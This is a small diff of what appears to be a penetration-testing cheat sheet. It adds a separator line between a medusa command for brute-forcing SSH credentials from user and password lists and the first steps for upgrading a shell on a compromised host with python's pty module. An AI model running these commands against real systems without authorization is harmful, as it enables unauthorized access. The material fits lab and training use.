@@ -7,7 +7,7 @@ Windows & *nix:
 <p> bruteforce (more options may be required, example used was SSH module):
 <p> - medusa -h [ip] -U [users.txt] -P [passwords.txt] -M [module] [ip] 
 </p>
-
+-----------------------------------------------------------------------------------------
 <p> upgrade shell using python pty library and adds auto complete for steps 2+ :
 <p> 1 - python -c 'import pty;pty.spawn("/bin/bash")'
 <p> 2 - CTRL z
